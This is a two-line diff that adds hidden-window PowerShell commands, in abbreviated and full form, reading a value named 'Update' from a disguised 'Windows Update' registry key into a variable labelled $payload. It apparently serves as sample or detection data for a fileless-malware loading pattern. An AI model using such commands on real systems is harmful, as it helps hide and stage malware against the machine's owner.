@@ -1,0 +1,2 @@
+powershell.exe -NoP  -NonI  -w Hidden  -c $x=$((gp HKCU:\Software\Microsoft\Windows Update).Update)
+powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command $payload=$((Get-ItemProperty "HKCU:Software\Microsoft\Windows Update").Update)
